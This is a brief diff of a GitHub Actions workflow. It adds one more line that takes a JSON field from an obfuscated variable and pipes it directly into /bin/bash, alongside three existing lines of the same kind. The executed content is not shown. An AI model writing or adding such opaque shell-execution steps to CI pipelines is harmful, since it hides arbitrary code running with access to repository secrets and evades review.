@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$l3" | jq -r .yqf156 | /bin/bash
           printf '%s' "$bhd24766" | jq -r .xgb0 | /bin/bash
           printf '%s' "$o16" | jq -r .it1632 | /bin/bash
+          echo $b0 | jq -r .ds36779 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
